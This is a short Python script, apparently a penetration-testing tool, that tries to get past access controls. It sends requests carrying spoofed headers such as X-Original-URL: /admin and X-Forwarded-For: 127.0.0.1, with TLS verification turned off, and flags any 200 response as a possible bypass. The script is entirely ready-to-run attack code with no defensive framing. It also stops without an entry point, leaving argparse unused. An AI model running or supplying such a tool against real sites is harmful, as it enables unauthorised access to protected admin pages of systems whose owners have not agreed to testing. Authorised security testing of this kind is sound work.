#!/usr/bin/env python3
import requests
import argparse
import urllib3
from colorama import Fore, Style, init

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def bypass_with_headers(url):
    headers_list = [
        {"X-Original-URL": "/admin"},
        {"X-Rewrite-URL": "/admin"},
        {"X-Custom-IP-Authorization": "127.0.0.1"},
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Forwarded-Host": "localhost"},
        {"X-Forwarded-Proto": "https"},
        {"X-Forwarded-Server": "localhost"},
        {"X-Real-IP": "127.0.0.1"},
        {"Referer": url},
        {"Origin": url},
    ]

    print(f"\n[*] Testing headers against: {url}\n")

    for headers in headers_list:
        try:
            r = requests.get(url, headers=headers, verify=False, timeout=8)
            status = r.status_code
            if 200 <= status < 300:
                color = Fore.GREEN
            elif 300 <= status < 400:
                color = Fore.YELLOW
            elif 400 <= status < 500:
                color = Fore.RED
            elif 500 <= status < 600:
                color = Fore.MAGENTA
            else:
                color = Fore.CYAN
            
            length = len(r.text)
            msg = f"{color}[{status}]{Style.RESET_ALL} {url} with {headers} (Length: {length})"
            # Highlight possible bypass
            if status == 200:
                msg += f"  {Fore.YELLOW}<< POSSIBLE BYPASS{Style.RESET_ALL}"
            

            print(msg)
        except Exception as e:
            print(f"[!] Error with {headers}: {e}")

